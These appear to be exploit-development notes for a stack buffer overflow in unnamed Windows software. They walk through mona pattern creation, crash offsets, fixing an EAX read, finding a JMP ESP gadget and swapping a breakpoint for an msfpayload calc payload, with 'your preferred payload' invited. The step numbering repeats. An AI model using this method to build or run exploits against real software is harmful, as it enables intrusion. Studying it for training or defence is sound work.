1. Use immunity debugger to generate pattern of the length of the PoC (9000) [xpl-2.py]:
    - !mona pattern_create 9000
    * Program crashed due to bad address read (from EAX) [in 0x7E43C1F9 - "MOV CL,BYTE PTR DS:[EAX]"]

2. Find pattern for which the read has been done (position 8210):
    - !mona findmsp

3. Overwrite EAX with a readable address value and concatenate the pattern [xpl-3.py]
    - xpl: ptrn[0..8210] + readable_addr + ptrn[8210..9000]

2. Find pattern with which the sEIP value has been overwritten (position 8206):
    - !mona findmsp

4. Find a JMP ESP instruction from a non ASLR/Rebased module
    - !mona jmp -r esp

5.  Place CC asm instruction to check if everything is working  [xpl-4.py]
    - xpl: junk[0..8216] + seip + read_addr + 0xCC

6. Exchange the breakpoint instructions with your preferred payload [xpl-5.py]
    - msfpayload windows/exec cmd=calc N
